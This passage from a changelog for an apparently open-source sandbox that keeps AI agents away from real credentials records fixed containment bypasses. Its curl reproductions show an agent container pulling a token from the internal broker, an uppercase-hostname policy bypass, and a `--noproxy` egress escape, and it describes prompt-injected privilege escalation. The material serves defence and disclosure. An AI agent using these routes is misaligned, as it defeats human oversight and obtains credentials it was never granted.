when both addons deny — `001_allowlist.py` runs second and overwrites the
response, so a shape with an enforcing allowlist records `reason=allowlist` for
what is actually an agent probing the credential broker. Not a weaker
boundary: the allowlist only sets a response when it denies, so listing
`broker` in an allowlist cannot lift the policy block. Tracked as #87.

### Upgrading

Nothing to do.

---

## 1.11.0 — 2026-08-15

A second kind of template, and the directory move that makes room for it. No
boundary change.

### Changed

**`template/` is now `template/deployment/`.** The first version assumed there
would only ever be one kind of template. There are two, so the level had to
exist; paying for it now was cheaper than it will ever be again. A deployment
that fetched `template/` at `v1.10.0`–`v1.10.2` finds it moved.

### Added

**`template/provider/<shape>/` — skeletons for writing a bank entry**, when the
bank does not carry the credential you need. The first shape is
`static-key/`: a long-lived secret read from a file, attached to requests
leaving the lab, never held by the lab.

It exists because the skeleton describes **this repo's image API** — mitmproxy's
`request(flow)` signature, `require("../audit")`, `import audit` resolving off
`PYTHONPATH`, nginx `location` syntax — and that description was living in a
downstream tool. Same shape as the deployment gap 1.10.0 closed, one level
down: an API change needed a release of a different repo, and nothing over
there could tell when its copy had gone stale. Reported and drafted from the
[`sal`](https://github.com/lpezet/secure-agent-lab-cli) side (#78).

Three decisions in it worth knowing:

**Nothing is exposed, and there is no `cred-gateway/` snippet.** A static key is
a reusable secret, and `CONCEPT.md`'s rule keeps those unexposed. A skeleton
shipping an exposed route would teach the one mistake that rule exists to
prevent. The shape that needs a gateway snippet is a *different* shape and gets
its own directory — which is what the `<shape>/` level is for.

**Shapes are named by mechanism, not by complexity.** `static-key` sits beside a
future `oauth-refresh` or `minted-token` as a sibling. A `basic`/`advanced` pair
would read as one scale and stop being true the moment a second shape arrived
that was not more advanced, only different.

**The placeholder is `acme`, and it is the only thing to replace.** The word
*provider* also appears in these files — as a fixed filename (`provider.json`),
as a schema enum value (`"load_band": "provider"`), as the audit trail's field
*name*, and as English — and none of those may move. An earlier draft used
`provider` for the placeholder too; substituting it downstream corrupted all
four, including renaming an audit field after the vendor, which changes the
shape of the trail rather than its contents.

**Skeletons are linted as entries.** The same invariant checks that run over
`bank/*/` run over `template/provider/*/` — host agreement, `flow.request.host`
rather than `pretty_host`, no client header selecting a credential, no raw path
in an audit event. A scaffold that failed this repo's own checks would teach
the mistake `PLAYBOOK.md` exists to prevent. What they are *not* checked for is
being installable: the hosts are `.invalid` and no credential exists behind
them.

Two invariants had never covered `bank/` either and now cover both:
`inv_raw_path_split` — which exists because `PLAYBOOK.md` shipped the bug it
detects as a *recommended* snippet — and `inv_exception_quoted`. Both were
already passing; the exemption was the finding.

### Upgrading

**If you fetch the deployment template by path, it moved**: `template/` →
`template/deployment/`. Nothing inside it changed, and a deployment already
running is unaffected — this is a path in this repo, not in yours.

---

## 1.10.2 — 2026-08-15

Two knobs on the deployment template, for running more than one stack on a
machine. No boundary change.

### Changed

**The observer's host port is parameterised**:
`"127.0.0.1:${OBSERVER_PORT-9000}:9000"`. The no-colon form is deliberate — an
*unset* variable takes 9000, an *empty* one stays empty and Docker assigns a
free port. So a template copied and run as before behaves exactly as before,
and two deployments on one machine stop colliding without anyone having to
choose and remember a port number per stack.

The `127.0.0.1` prefix is literal and comes first, so no value of
`OBSERVER_PORT` can move the dashboard off loopback. That is the property that
makes publishing it acceptable at all: the observer serves the audit trail over
plain HTTP with no auth.

**`observer` sits behind a compose profile**, enabled by `COMPOSE_PROFILES` in
`.env.example`. The default is unchanged — the template still ships with the
audit trail on — but turning the dashboard off is now a value rather than an
edit. Deleting the service block made a deployment that had merely switched a
feature off look like one that had diverged from its template, to
`check-drift.sh` and to the graph comparison in `00-config-lint`.

Only the viewer is optional. The three services that *write* the trail and
`log-rotator` which bounds it are unprofiled, so this costs the dashboard and
never the audit trail.

Both reported from the [`sal`](https://github.com/lpezet/secure-agent-lab-cli)
side, where a lab runs per project rather than per machine (#79, #80).

### Fixed

**The observer-port lint asserted a literal mapping** (`"127.0.0.1:9000:9000"`)
and so would have rejected any legitimate port choice, including this one. It
now asserts the `127.0.0.1:` prefix — the part no deployment may choose — and
leaves the number alone.

### Added

**A lint on declared-but-unenabled profiles.** Compose reads an absent
`COMPOSE_PROFILES` as "no profiles enabled", so a profiled service that nothing
turns on is silently missing. `00-config-lint` now fails when
`template/compose.yaml` declares a profile that `template/.env.example` does
not enable — the difference between a convention and something that holds.

### Upgrading

Nothing to do. A deployment already running keeps its `ports:` line and needs
no `COMPOSE_PROFILES`; both changes are to the template rather than to any
image.

To pick them up in an existing deployment, take the `observer` block and the
two `.env.example` entries from `template/` at this tag.

---

## 1.10.1 — 2026-08-15

Documentation and the examples. No boundary change, no image change.

### Changed

**Both examples repin to `v1.10.0`,** from `v1.2.0` and `v1.3.1`. An example
several releases behind teaches an old boundary to whoever copies it, which is
the opposite of the job: everything gained since — the profile-selection fix,
the shared host matcher, the invariant checks, the GCP entry, the hostname
normalisation, the baked base addons — was invisible from there.

Neither vendors `000_policy.py` any more. The image carries it, the entrypoint
loads it ahead of the mount, and a vendored copy is dead weight it warns about.

**`README.md` is 71 lines shorter** and three of its sections now point instead
of restating. One of those was not merely duplicated but wrong: *Proxy
allowlist* still told you to copy `001_allowlist.py` into `proxy/`, unnecessary
since 1.10.0 baked it into the image — following it would have produced exactly
the stale vendored copy that release exists to eliminate.

**The deployment template repins with each release**, so a template fetched at
a tag names that tag. `00-config-lint` fails if it falls behind the newest
`CHANGELOG` heading, which is what turns this from something to remember into
something that breaks the build.

### Added

**`CONCEPT.md`** — the model in one place: the problem, the approach, why
cred-gateway exists as a separate service, and what a deployment does not get
to choose.

Two things in it were not written down anywhere before. **What this does not
protect against**, chief among them that a malicious agent can spend whatever
it is allowed to spend — the central limitation of the design, previously left
to be inferred, with the consequence that the real control is the scope of the
credential the broker mints and that scope is set outside this stack. And the
cred-gateway exposure rule as a *rule*: a route may be exposed when what it
hands over is short-lived and scoped; a route handing over a reusable secret
stays unexposed.

It ends with the table saying which artefact is authoritative for what — the
images, the template, the bank, `PLAYBOOK.md`, `CLAUDE.md`. That table is only
true as of 1.10.0, which is why it arrives now: the gap it closes is the same
one that let a deployment ship with no internal-host block, having read a
document that said it needed to read nothing else.

**`examples/README.md`** — the two examples, and the two independent axes along
which they differ. Service count is the hardening axis; delivery mechanism is
not, and reading them as a single scale would be wrong.

**A cross-link lint.** Trading restatement for pointers only pays while the
pointers are good, so every relative link in the top-level documents is
asserted to resolve.

### Upgrading

Nothing to do.

---

## 1.10.0 — 2026-08-15

Two things the deployment was left to get right on its own, and should not have
been: the controls it must not be able to omit, and the wiring it had to
reconstruct from three disagreeing candidates.

### Added

**The proxy image carries `000_policy.py` and `001_allowlist.py`.** A consumer
built a deployment with an empty `proxy/` directory — reasonable logic, since
the bank supplies proxy addons and a fresh lab has installed none — and from
inside the lab container got a real credential back:

```
curl http://cred-gateway/anthropic/cred   → 403     (the route is not exposed)
curl http://broker:8080/anthropic/cred    → {"type":"auth_token","value":"sk-ant-oat01-…"}
```

cred-gateway did its job. It is not the only path to the broker: the proxy sits
on both networks, and with no policy addon loaded it forwards.

The requirement *was* documented, and mechanically checked twice. None of it
reached them, because all of it lives in the half of the repo addressed to
whoever *writes* a deployment, while `bank/README.md` advertises a bar saying
you need not read it. **A mandatory control whose enforcement depends on the
deployment having copied a file is not mandatory**, and documenting it harder
was the fix that had already been tried three times.

So: a control the deployment does not get to choose belongs in the image. Not
a new principle — `stack/cred-gateway/Dockerfile` bakes `nginx.conf` in
precisely so its default-deny cannot be substituted at runtime, taking only the
*allowances* from a mount.

Both addons are baked to `/opt/agent-proxy/addons/` — **not** `/addons`, which a
deployment's bind mount replaces wholesale — and loaded ahead of it. A vendored
copy is skipped with a warning naming the file; the image's copy wins. Load
order stops being alphabetical luck: policy runs first by construction.

`001_allowlist.py`'s semantics are unchanged: still gated on a mounted
`/etc/agent-allowlist`, still permissive-with-a-warning without one. What
baking removes is the copy-from-the-right-tag hazard this changelog used to
warn about by hand.

**`POLICY_INTERNAL_HOSTS`** on the proxy service, default `broker,cred-gateway`,
for stacks that rename their services. Deployment config, never request data —
the rule that took `X-Cf-Profile` out of the Cloudflare addon.

**`template/` — the deployment template.** The wiring, pinned to a release tag
and fetched the same way a `bank/` entry is: the service graph, both networks,
the volumes, the mounts. It ships the hardened shape — audit trail on, `lab`
network internal, allowlist file mounted — because it is the thing people copy,
and a control you removed is easier to notice than one you never had.

It exists because "what does a deployment look like" had three answers and no
authority: a reference skeleton whose own header says it will not work as-is,
and two examples pinned several releases back. A downstream tool had written
its own service graph to fill the gap, which put a change to *this* stack's
wiring behind a release of a different repo.

`stack/compose.yaml` stays, and stays the maintainer's file: it mounts the repo
layout because it sits beside the image sources, where a deployment mounts
`./broker` and `./proxy` directly. The two cannot be one file. `00-config-lint`
compares their service graphs — services, per-service network membership,
volumes — so the shape cannot drift even though the mount paths differ.

### Changed

**`scripts/check-drift.sh` reads your pin and inverts around this release.**
Below `v1.10.0` an unvendored `000_policy.py` is a missing control and it
hard-fails. At or above, the image carries it and a vendored copy is a note —
dead weight the entrypoint ignores. A pin that is not a release tag takes the
vendoring branch, because that is the direction that fails closed.

**`scripts/check-invariants.sh` downgrades that check to a note.** It documents
that it reads no upstream and no pinned tag, and this question now needs one.
Ordering — a vendored policy addon must still load first — stays a failure, and
is now actually asserted; the suite that claimed to cover it never did.

### Upgrading

**Delete your vendored `proxy/000_policy.py` and `proxy/001_allowlist.py`** once
you repin to `v1.10.0`. They are ignored either way, so this is tidying rather
than a fix — but a file that reads as a control it no longer is will mislead
whoever reads it next. `scripts/check-drift.sh` names them.

Nothing else. If you vendored a *modified* policy addon, note that the image's
copy now wins: move whatever you changed into `POLICY_INTERNAL_HOSTS`, or say
so on an issue if that is not enough to express it.

---

## 1.9.2 — 2026-08-15

A security fix. **An uppercased hostname bypassed the internal-host block
entirely**, in every release up to and including 1.9.1.

### Fixed

**`000_policy.py` compared the host without normalising it.**

```
curl --proxy http://proxy:8080 http://BROKER:8080/github/token   → 200, the broker's response
curl --proxy http://proxy:8080 http://broker:8080/github/token   → 403
```

DNS is case-insensitive, so `BROKER` reaches the same container `broker` does,
and the addon's `host in _INTERNAL_HOSTS` against a lowercase set did not
match. A trailing root dot — `broker.` — did the same thing.

This is not a weakened defence-in-depth layer. The proxy sits on both `secure`
and `lab`, so a request *through the proxy* is the exact path this addon exists
to close; on that path it is the only control, and Docker network isolation
does not back it up. What got through was `/github/token`, `/anthropic/cred`
and every other broker route — the raw credentials cred-gateway deliberately
does not expose.

Every other addon already handled this. `001_allowlist.py` lowercases before
matching, and `hostmatch.normalize()` exists for precisely this. This file was
the only one doing neither, which is what made it findable.

The fix normalises both the real destination and the claimed one — lowercase,
strip a `:port`, strip a trailing root dot — through a local `_norm()` rather
than `hostmatch.normalize`. Deployments **vendor** this file, and a deployment's
image may be built from a tag older than the 1.7.0 that added `hostmatch.py`;
an addon importing a module its image does not carry fails to load and takes
every destination down with it, which is worse than the bug. Both examples are
pinned below 1.7.0 and `00-config-lint` enforces this.

Found while starting #62, which will bake this addon into the image and remove
the vendoring hazard that makes the fix travel slowly. Proven before it was
fixed: the assertions were committed with no fix and CI returned
`expected: 403 | actual: 200`, then the fix turned them green. The PR gate that
answered it had existed for three days (1.9.1).

### Upgrading

**This one has a manual step, and skipping it leaves the bypass open.**

The policy addon is a file your deployment owns, so a new image does not carry
the fix to you. Repin to `v1.9.2` **and** re-vendor `proxy/000_policy.py` from
`stack/proxy/addons/` at that tag:

```bash
scripts/check-drift.sh /path/to/your/deployment
```

reports it as drift once you have repinned. Until both halves are done, the
deployment keeps the vulnerable copy.

If you cannot repin immediately, the one-line mitigation is to normalise both
sides of the comparison in your existing copy:

```python
if _norm(host) in _INTERNAL_HOSTS or _norm(flow.request.pretty_host) in _INTERNAL_HOSTS:
```

with `_norm` as written in `stack/proxy/addons/000_policy.py` at this tag. It
depends on nothing the image provides, so it is safe on any pin.

---

## 1.9.1 — 2026-08-15

No boundary change. The suite that guards the boundary now runs on every pull
request — and its first run found a bug in the suite itself.

### Added

**The integration tier runs in CI.** There was no `.github/` in this repo at
all: every assertion in `tests/` ran only when somebody remembered to run it
locally. That is an odd gap for a project whose subject is a security boundary,
and which already ships the suite that would catch a regression in it. The
invariants in `scripts/lib/invariants.sh` exist because the same class of
provider bug shipped twice; un-gated, the third would have merged the same way.

Two jobs, on `pull_request`, on `push` to `main`, and on `workflow_dispatch`:
`lint` runs the docker-free band (`00 05 06 07 08`) so "the invariants failed"
reads as its own result in about twenty seconds, and `integration` runs the tier
command verbatim rather than a list of the docker suites — a hardcoded list
would silently stop covering whatever suite is added next, which is the one
failure mode a test gate must not have.

**The e2e tier is deliberately absent, and must stay absent from anything
`pull_request` can trigger.** This is a public repo, so a fork PR that edits a
test file runs attacker-authored code in the job, and the e2e job is the one
that would hold the dedicated App's private key. It gets its own workflow on
`workflow_dispatch` + `schedule`, with the credential handling designed rather
than inherited. `permissions: contents: read` on the workflow is what keeps the
PR gate credential-free by construction rather than by everyone remembering.

Raised by the authors of
[`secure-agent-lab-cli`](https://github.com/lpezet/secure-agent-lab-cli),
reviewing this repo as a consumer building on it (#61).

### Fixed

**`45-broker-github-scope` could only pass as uid 1000.** `openssl genrsa -out`
writes the App key at 0600, owned by whoever runs the suite. The broker image
drops to `node` (uid 1000), and a bind-mounted file keeps its host uid inside
the container — so the broker could read that key only when the host user
happened to *be* uid 1000. True on a typical workstation, false on a GitHub
runner (uid 1001), where every assertion in the suite failed with `EACCES`.

Latent since the suite was written, and not findable locally. It also surfaces
badly — `{"error":"internal error"}` and an `"error":"EACCES"` audit line, naming
neither the file nor permissions — so the quirk is now written down in
`tests/README.md` beside the WSL `credsStore` one.

### Upgrading

Nothing to do. No image, no addon, no manifest and no configuration changed;
this release is a workflow, a test fix and documentation. A deployment pinned at
`v1.9.0` is byte-for-byte unaffected by moving to `v1.9.1`.

---

## 1.9.0 — 2026-08-11

One field, so that something outside this repo can install from the bank
without guessing.

### Added

**`schema_version` on every bank manifest.** The bank exists to be installed
from — the correctness bar in `bank/README.md` is that someone *or something*
holding only `bank/<name>/` and a running stack can install the provider. The
"or something" is a tool that does not live here, and it had no way to tell
whether it understood the contract it was reading. This is the one point where
the bank and such a tool are allowed to break compatibility, and until now it
did not exist.

Required, an integer, currently `1`. Three decisions in it, each with a
plausible alternative:

**Per entry, not once for the bank.** A version living in `bank/schema/` would
leave an entry copied out of the bank unversioned — which fails the standalone
bar above exactly, since that entry is still meant to be installable on its own.

**An integer, not a semver.** This is a compatibility generation. A minor number
invites "1.1 is probably close enough", and that guess is the whole thing the
field exists to remove.

**Refuse higher, not best-effort.** An installer supports a fixed set of
generations and refuses anything above them. A manifest from the future may
declare a control the installer does not know to apply, and an install that
silently skips a control is worse than one that refuses to run. The rule is
written into the field's own `description`, because the schema is what a future
installer actually reads — not into prose it will never see.

Bump it for anything an installer must act on: a new field, a changed meaning, a
changed directory convention. Not for rewording a description. It should move on
the order of never; if it moves often, the manifest has become a config file.

The lint reads the accepted value out of the schema's `const` rather than
restating it, matching how it already sources `required[]`, the `load_band` enum
and the `name` pattern — so bumping the generation in the schema is what bumps
it in the suite, in one commit.

### Upgrading

Nothing to do, and no boundary change. A deployment does not read manifests;
they describe bank entries for whoever installs them.

**If you have written your own bank entry**, add `"schema_version": 1` to its
`provider.json`. The lint fails without it, since the schema now requires it.

---

## 1.8.0 — 2026-08-11

Three ways the boundary was weaker than the documentation said, none of them
in the mechanism: whose credentials went in, whether the trail existed where it
mattered, and which clients actually used the proxy.

### Added

**`check-invariants.sh --secrets-dir <path>` asks whose credential this is.**
The mitigation is only ever as strong as its setup, and nothing stopped someone
dropping a personal access token into the secrets directory and pointing a
provider at it. Value isolation survives that intact — the agent still never
reads the secret — and authority isolation collapses, because the agent now
acts as that person everywhere they can reach. Same mechanism, blast radius of
a human.

Each credential is classified by shape: a PEM header, a JSON `type` field, a
token prefix. A GitHub PAT and a bare `authorized_user` ADC fail. A GitHub App
key and both machine ADC shapes pass silently.

Three things it deliberately does not do. It never reads, prints or transmits a
value — detection is quiet greps, and the output is a filename and a verdict.
It never follows a path out of the directory it was given. And it says what it
cannot vouch for instead of passing over it: an Anthropic key has no machine
identity to compare against, and an unrecognised shape is not evidence of
anything, so both are notes. Absence of the flag is reported too — a run that
never looked at the credentials has established nothing about whose they are.

One bug this found by being run against a real `~/.config/gcloud` file rather
than a fixture: an impersonated ADC nests the credential doing the
impersonating, and gcloud writes keys alphabetically, so
`source_credentials.type: authorized_user` appears *before* the top-level type.
Reading the first match called the safest shape this stack supports the
operator's own identity — on every deployment using it. The type is now read at
depth 1, ignoring anything inside a string.

**The e2e tier now carries the audit trail it was the only place able to
check.** The tier that runs against real credentials wired no trail at all: no
`audit-logs` volume, no `AUDIT_LOG`, so every `logEvent` call it made was a
silent no-op. That had a cost, which is how it was found — a real `git push`
403'd during 1.7.0's GCP work, and "what scope does this installation token
actually carry" is precisely what 1.6.0 put in the trail to answer. The answer
was unavailable in the one tier holding a real token, and the diagnosis came
from the GitHub UI instead.

broker, proxy and cred-gateway now share the volume there, with `log-rotator`
alongside them. Not decoration: three different non-root uids write that
directory and the rotator's entrypoint is the only thing that can chmod it for
all of them. `observer` stays out — it publishes over HTTP, and the suites read
the volume directly.

New suite `50-audit`, 18 assertions, running last so it sees what the earlier
suites provoked and provoking its own events first so it still works alone.
What it adds over the integration tier's `35-audit-leak` is that the trail
describes *real* authority: `permissions` and `repository_selection` from a
live installation, the enum rather than repository names, an injection recorded
with its provider, the credential-helper request recorded and the healthcheck
not.

### Fixed

**The lab proxied its HTTP clients and not its gRPC ones.** gRPC core reads
`grpc_proxy`, `https_proxy` and `http_proxy` — lowercase only — and every
compose file here set the uppercase forms alone. Measured: zero flows reached
the proxy with uppercase set, two with lowercase. gRPC also bundles its own
roots and reads none of the three CA variables already exported, so it needs
`GRPC_DEFAULT_SSL_ROOTS_FILE_PATH` as well. Both are now set everywhere.

Scoped honestly: **with `internal: true` this failed closed**, which is why it
went unnoticed — the lab has no route out except the proxy, so an unproxied
gRPC client reached nothing. With `LAB_INTERNAL=false` it did not fail closed:
there is a default gateway, so the client egressed directly, past the allowlist
and absent from the audit trail. Neither failure announces itself — gRPC does
not raise a TLS error, it retries and hangs.

`proxy_env_case` fails a compose that sets one case and not the other, so the
next deployment hears about it rather than discovering it the day something
speaks gRPC.

**A justification we shipped in 1.7.0 was false.** `/gcp/token` is exposed
through cred-gateway, and the snippet, `PLAYBOOK.md` and `CLAUDE.md` all
explained that by saying some tooling cannot be mediated by the proxy at all,
with gRPC client libraries as the known case. Measuring it gave the opposite
answer: mitmproxy intercepts gRPC through CONNECT, an addon reads and rewrites
the `authorization` metadata, and the rewritten value reaches the server.

The route stays. What carries it is the parity with `/github/credential` — a
short-lived scoped token rather than a reusable secret, and the authority
handed over is the service account's IAM roles either way — which was always
the load-bearing half of the argument. The stated reason is now the true one,
and `PLAYBOOK.md`'s "what the proxy has not been shown to mediate" loses its
gRPC half to a measured answer. Signature-based auth like AWS SigV4 remains
genuinely unswappable and stays on that list.

### Upgrading

Nothing is required to stay safe, and the boundary is unchanged in every
deployment running the default `internal: true`.

**If you run `LAB_INTERNAL=false`, add the lowercase proxy variables.** That is
the configuration where the gRPC gap was real egress. Copy them from any
`compose.yaml` here:

```yaml
http_proxy: http://proxy:8080
https_proxy: http://proxy:8080
no_proxy: localhost,127.0.0.1,cred-gateway
GRPC_DEFAULT_SSL_ROOTS_FILE_PATH: /proxy-certs/mitmproxy-ca-cert.pem
```

A compose file setting one case without the other now fails
`check-invariants.sh`.

**`check-invariants.sh` will note that it did not check your credentials.**
Passing `--secrets-dir ~/.config/agent-creds` is opt-in and reads nothing but
the shape of each file. The note is the honest report of a check not run, not a
new defect.

---

## 1.7.0 — 2026-08-09

A cloud identity the agent can use and cannot take, and one host matcher
instead of one per addon.

### Added

**GCP, as a bank entry.** The agent gets a short-lived access token for one
service account, and the sentence that bounds blast radius is the one to read
twice: **its authority is exactly that service account's IAM roles**. A service
account with `roles/owner` produces an agent with `roles/owner`. Choosing those
roles narrowly is the deployment's job — the same bargain as a GitHub App's
permissions bounding an installation token, now stated outright in
`PLAYBOOK.md` rather than left implicit.

Two credential shapes, because they fail differently rather than because one is
better:

| | `impersonated_service_account` | `service_account` (key file) |
|---|---|---|
| broker holds | the operator's refresh token | the SA's private key |
| expires | when the OAuth session does | never |
| if it leaks | revocable, visible in Google session management | silent and permanent until noticed |
| unattended | **may need periodic human re-login** | yes |

Impersonation is the recommendation: no key exists anywhere, and many
organisations forbid keys outright via
`constraints/iam.disableServiceAccountKeyCreation`. It is not the only workable
choice. A Google Workspace Cloud session-length policy expires that refresh
token on a schedule — commonly 16–24 hours — and when it goes the broker stops
minting until a human re-runs `gcloud auth application-default login`, which is
fatal for an agent meant to run unattended. Both shapes ship and the trade is
documented rather than the alternative being omitted.

A bare `authorized_user` ADC is refused outright: that is the operator's own
identity with no narrowing at all. `external_account` (Workload Identity
Federation) is refused explicitly as unimplemented — it cannot be exercised
without a real identity provider to federate from, which would make it the only
credential path taken on faith. Split out as its own issue rather than shipped
unverified.

**The addon does two things, and the split is the design.** A Google client
library will not call an API until its credential chain has produced a token,
and with the lab's inert ADC file that chain ends in a POST to
`sts.googleapis.com`. The addon answers that exchange itself, with the same
inert `proxy-injected` value the lab already hands `gcloud` and `gh`. The
client is satisfied and holds nothing; the real token is attached in flight on
the API call. Answering the exchange with the real token would also work and is
simpler — the inert value is preferred because an injected token then exists
only on requests already bound for `googleapis.com`.

`/gcp/token` **is** exposed through cred-gateway, unlike Anthropic's and
Cloudflare's credential routes. Some tooling cannot be mediated by the proxy at
all — gRPC client libraries are the known case — and this is the same bargain
as `/github/credential` rather than an exception to the rule. The routes that
stay closed are the ones handing over a *reusable* secret rather than a
short-lived scoped one.

**`stack/proxy/hostmatch.py` — one matcher, shared.** `001_allowlist.py` had
the correct suffix algorithm and kept it private, so the next addon needing it
had to write its own. Host matching reimplemented per addon is how
`pretty_host` ended up in three files at once and stayed there. Baked into the
image beside `audit.py`, on the same `PYTHONPATH`, so a bind-mounted addon can
import it regardless of load order.

It matches on label boundaries — `*.example.com` covers `a.example.com` and
`a.b.example.com`, never the `example.com` apex and never `evilexample.com` —
normalises case, a trailing root dot and a `:port` suffix, and returns *which*
pattern matched so a caller can keep per-entry state on top of it. A longer
wildcard suffix beats a shorter one regardless of list order, so reordering a
config file cannot change which rule applies. An uninterpretable pattern is
skipped rather than raised on: a bad line in a deployment's allowlist must not
be able to take the proxy down, and skipping denies rather than permits.

**A wildcard is safe for credential injection only when the entire suffix is
single-tenant.** The allowlist and an injection addon both match hosts with
different blast radius: a too-wide allowlist entry means the agent can *reach*
something it should not, a too-wide injection match means a live token is
*handed* to whoever owns the name. `injection_wildcard_multitenant` fails on a
known list — `workers.dev`, `pages.dev`, `myshopify.com`, `herokuapp.com`,
`vercel.app`, `netlify.app`, `s3.amazonaws.com`, `blob.core.windows.net`,
`github.io` — and `injection_wildcard` notes on every other wildcard. A note
rather than a failure because `*.googleapis.com` is legitimate and now ships,
and because the list will never be complete: the note is what covers the
suffixes nobody thought of.

**`PLAYBOOK.md` says where the injection model stops.** Everything in it
assumed the proxy can read the request it is adding a header to, which has only
been exercised against HTTP/1.1 clients. gRPC over HTTP/2 — Pub/Sub, Spanner,
Firestore, Bigtable — is untested, and signature-based auth like AWS SigV4
cannot be swapped at all. Both fail closed on an internal lab network, and the
symptom is a resolution or TLS error rather than a permission error, which is
the part that otherwise costs an afternoon.

### Fixed

**A cached test image made suites pass against code they could not contain.**
`build_image` reused any existing tag, so adding `hostmatch.py` produced
`ModuleNotFoundError` in every proxy suite — reported as "proxy did not become
ready", which points nowhere near the cause. A stale image that still *starts*
is the worse outcome: a pass against the wrong code. It now rebuilds when any
file in the build context is newer than the image.

**The shared Python strip helper mangled docstrings containing quotes.**
`_inv_strip_py` matched a same-line docstring with `"""[^"]*"""`, which stops at
the first quote character inside it — so a docstring quoting the anti-pattern it
warns about survived the strip and read as code. Every addon here documents the
pattern it must not use, so that is the house style, not an exotic case.

### Upgrading

Nothing is required, and no manual step is needed to stay safe. Two things a
deployment may notice.

**The new wildcard checks may report your own addons.** An addon that attaches
a credential header and matches a wildcard host will produce a note on every
`check-invariants.sh` / `check-drift.sh` run, or a failure if the suffix is on
the multi-tenant list:

```
FAIL   injects a credential for a wildcard suffix anyone can register under
note   injects a credential for a wildcard host suffix — is the whole suffix single-tenant?
```

The note is not a defect to silence. It asks whether one party holds every name
under that suffix, and only you can answer it.

**If you vendor `001_allowlist.py`, copy it from the tag you pin.** Since 1.7.0
that addon does `import hostmatch`, which only exists in images built from
1.7.0 or later — a newer copy on an older image fails to load, and the proxy is
what fails, taking every destination with it. Neither example vendors it (it is
opt-in), so this binds only deployments that copied it by hand.

---

## 1.6.0 — 2026-08-08

Two halves of the same subject: who decides how much authority the agent gets,
and whether you can see how much it got.

### Fixed

**The lab container chose which Cloudflare profile was issued to it.**
`X-Cf-Profile` named the profile the addon then asked the broker to mint. That
was harmless while one profile shipped, and decorative the moment a deployment
added a second at a different privilege level — which is the entire reason
profiles exist. A prompt-injected agent asks for `prod-ir`, gets it, and the
audit line records the escalation as though it had been authorised.

The profile is now deployment configuration: `CLOUDFLARE_PROFILE`, read once at
load from the proxy's own environment. The header is still stripped so it never
reaches the vendor, but its value is discarded rather than read. The broker is
configured with the same value and 403s any other profile — that half still
holds if a future addon goes back to trusting the header, and it refuses
*before* the outbound mint.

Scoped honestly: **no credential ever leaked, and no deployment shipping only
`workers-deploy` could escalate anything** — there was one rung on the ladder.
What was broken is a property the design depends on, that the untrusted side
does not author its own authority, and it would have become exploitable in the
deployment that first added a second profile.

The general rule now has a check behind it. `header_selector` fails any addon
that binds a client-supplied request header to a name it acts on. Stripping is
not reading: a bare `pop()`/`del` is the correct way to drop a client header and
stays clean. Same family as `pretty_host` — both catch a security decision made
from data the lab container writes.

### Added

**GitHub audit lines say what the token can do, not just that one was issued.**
The broker mints installation tokens at whatever scope the App's installation
grants, and that grant is configured in GitHub's web UI, outside this stack. So
the stack inherited a ceiling it never participated in setting and then never
mentioned it again: "what can this lab currently do to GitHub?" was a question
you answered by opening GitHub settings, not by reading the trail.

`token_issued` and `credential_issued` now carry `permissions` and
`repository_selection`. Both routes — `git push` travels the credential route,
and leaving it out would have made the most-used path the least visible.

Repository *names* stay out. `observer` serves the trail over HTTP, and the
`all`/`selected` enum already answers whether the installation is org-wide.

**Reports the ceiling, does not lower it.** Narrowing what gets minted is a
different piece of work: it needs a per-scope cache and a config surface, and it
breaks `git push` if scoped wrong.

Failure degrades the trail, not the token. An unreachable installation endpoint
sets the field to `unknown` and the mint proceeds — describing a credential must
never be what stops it being issued.

**`observer` renders structured audit fields as JSON.** The dashboard built
cells as `` `${k}=${v}` ``, and `permissions` is the first nested object to
reach the trail, so it would have printed `[object Object]`. Still rendered as
text via `textContent`, never as markup.

### Upgrading

Nothing is required, and no manual step is needed to stay safe.

**`CLOUDFLARE_PROFILE` defaults to `workers-deploy`** on both the proxy addon
and the broker provider, which is what every existing deployment already
issues. Set it explicitly on **both** services if you want a different profile —
a mismatch between the two fails closed with a 403 rather than silently picking
one.

**The new invariant may report a deployment's own addons.** Any hand-written
addon that reads a request header into a variable will start showing a finding
on each `check-invariants.sh` / `check-drift.sh` run:

```
FAIL   binds a client-supplied request header to a name the addon acts on
```

If the addon acts on that value, that is the bug this release fixed, in your
copy. If it only strips the header, rewrite it as a bare `pop()`/`del`.

**The `observer` fix is an image change**, unlike the provider files beside it.
A deployment pinned below this release keeps rendering `permissions` as
`[object Object]` until it repins. Cosmetic — the field is in the trail either
way.

---

## 1.5.0 — 2026-08-02

The release that stops trusting the operator, in the same way the design
already refuses to trust the agent.

### Changed

**The `dev` service, network and directory are now `lab`.** "dev" implied a
developer sits in the container. Nobody does — it is where an autonomous agent
runs unattended, and the name was steering how the documentation described the
boundary. `stack/dev/` → `stack/lab/`, each example's `dev/` → `lab/`, the
compose service and network, and prose throughout.

Not renamed, because they name someone else's thing: `.devcontainer/`,
`devcontainer.json`, the `examples/dev-container/` directory, and "Dev
Containers" the VS Code feature.

**The `lab` network is `internal: true` by default, so the proxy can no longer
be bypassed.** The egress allowlist has been advisory since it shipped: nothing
forced traffic through the proxy, so `curl --noproxy '*'` left the container
without touching any addon. `HTTP_PROXY` is a request, not a routing
constraint. Removing the network's default gateway makes the proxy the only
route out, and the allowlist enforcing.

Verified on a running stack rather than argued:

| | `internal: true` | `LAB_INTERNAL=false` |
|---|---|---|
| lab → internet direct (`--noproxy '*'`) | blocked | 200 |
| lab → internet via the proxy (`CONNECT`) | 200 | 200 |
| lab → broker | unreachable | unreachable |
| broker → `api.github.com` (on `secure`) | 200 | 200 |

Proxied traffic is unaffected because the **proxy** resolves the hostname, not
the client. `secure` is deliberately not internal — the broker calls provider
APIs directly through it.

`LAB_INTERNAL=false` opts out, for tooling that cannot use an HTTP proxy at all
(raw sockets, `ssh`, anything resolving before it proxies). The symptom of
needing it is a DNS failure inside the lab, not a proxy error. Opting out costs
egress mediation and nothing else: the broker stays unreachable either way,
because that is `secure` network isolation and this flag does not touch it. It
is never silent — `check-invariants.sh` reports the opt-out on every run.

### Added

**`bank/` — vetted provider implementations, installed as data.** Every
security incident this project has had came from someone writing a provider
file, and two of them shipped in `PLAYBOOK.md` as the *recommended* pattern.
Making the safe version the thing you install rather than the thing you are
told to write is a different kind of control from documenting it better.

An entry is `provider.json` plus the files it implies, and is complete enough
that holding only `bank/<name>/` and a running stack is enough to install it.
`github`, `anthropic` and `cloudflare` ship as entries; their manifests were
derived from what each provider actually reads, not from the playbook's
description of it.

Three things the bank *deleted*, which is the better measure of it: the
